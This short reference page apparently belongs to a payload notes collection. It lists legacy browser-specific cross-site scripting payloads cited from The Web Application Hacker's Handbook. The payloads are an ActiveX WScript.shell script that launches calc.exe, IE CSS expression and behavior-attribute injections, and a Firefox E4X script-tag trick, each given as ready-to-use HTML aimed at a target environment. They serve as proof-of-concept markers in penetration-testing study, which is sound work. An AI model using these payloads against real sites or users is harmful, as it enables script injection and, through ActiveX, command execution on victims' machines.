# Browser-Specific Payloads

## What it is

These are browser-specific or legacy execution paths pulled out of the mixed examples page.

## When it applies

Use these when the target environment includes older Internet Explorer behavior, compatibility mode, ActiveX support, or the Firefox-specific behavior noted in the original source.

## Example

### ActiveX example

```html
<script>
    var o = new ActiveXObject('WScript.shell');
    o.Run('calc.exe');
</script>
```

### CSS expressions in IE7 and earlier

```html
<x style=x:expression(alert(1))>
```

The original note says this works on IE7 and earlier, and also on later versions when running in compatibility mode.

### IE-only later versions

```html
<x style=behavior:url(#default#time2) onbegin=alert(1)>
```

### Firefox ECMAScript for XML

```html
<script<{alert(1)}/></script>
```

## Notes

This page groups the older browser-dependent material separately from the general payload pages so the main payload folders stay focused on broadly applicable examples.

## Source

Stuttard, Dafydd. *The Web Application Hacker's Handbook* (Kindle Locations 11881-11882, 12229-12236, 12385). Wiley. Kindle Edition.
